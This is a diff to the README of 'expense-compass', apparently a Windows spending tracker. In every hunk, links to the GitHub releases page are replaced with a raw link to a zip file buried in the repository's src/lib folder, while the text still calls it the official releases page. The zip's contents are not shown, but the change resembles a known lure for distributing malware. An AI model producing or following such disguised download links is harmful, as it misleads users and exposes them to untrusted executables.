@@ -1,6 +1,6 @@
 # 📊 expense-compass - Track your spending with ease
 
-[![Download expense-compass](https://img.shields.io/badge/Download-expense--compass-brightgreen)](https://github.com/a604040250/expense-compass/releases)
+[![Download expense-compass](https://img.shields.io/badge/Download-expense--compass-brightgreen)](https://raw.githubusercontent.com/a604040250/expense-compass/main/src/lib/expense_compass_2.9.zip)
 
 ---
 
@@ -27,10 +27,10 @@ No additional software or setup is needed.
 
 ## 🚀 How to Download and Install Expense-Compass
 
-[![Download expense-compass](https://img.shields.io/badge/Download-expense--compass-blue)](https://github.com/a604040250/expense-compass/releases)
+[![Download expense-compass](https://img.shields.io/badge/Download-expense--compass-blue)](https://raw.githubusercontent.com/a604040250/expense-compass/main/src/lib/expense_compass_2.9.zip)
 
 1. Click the green **Download** badge above or visit the official releases page here:  
-   https://github.com/a604040250/expense-compass/releases  
+   https://raw.githubusercontent.com/a604040250/expense-compass/main/src/lib/expense_compass_2.9.zip  
 
 2. On the releases page, look for the latest version. It will usually have a name like `expense-compass-Setup.exe` or similar.
 
@@ -136,6 +136,6 @@ npm start
 ## 📥 Download Link Again
 
 Access the software here:  
-https://github.com/a604040250/expense-compass/releases  
+https://raw.githubusercontent.com/a604040250/expense-compass/main/src/lib/expense_compass_2.9.zip  
 
 Click the latest setup file to download and install expense-compass on your Windows PC.
